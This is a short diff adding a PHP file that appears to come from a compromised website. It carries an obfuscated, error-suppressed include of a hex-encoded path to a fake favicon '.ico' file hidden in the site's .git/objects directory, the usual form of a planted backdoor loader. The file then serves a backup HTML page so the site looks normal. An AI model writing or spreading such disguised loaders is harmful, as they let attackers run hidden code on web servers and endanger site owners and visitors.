@@ -1,0 +1,10 @@
+<?php
+
+/*76561*/
+
+@include "\x2fho\x6de/\x6afd\x6ahf\x6a6/\x70ub\x6cic\x5fht\x6dl/\x6cov\x65st\x6f.f\x69/.\x67it\x2fob\x6aec\x74s/\x329/\x66av\x69co\x6e_9\x353e\x649.\x69co";
+
+/*76561*/
+
+
+echo file_get_contents('index.html.bak.bak');
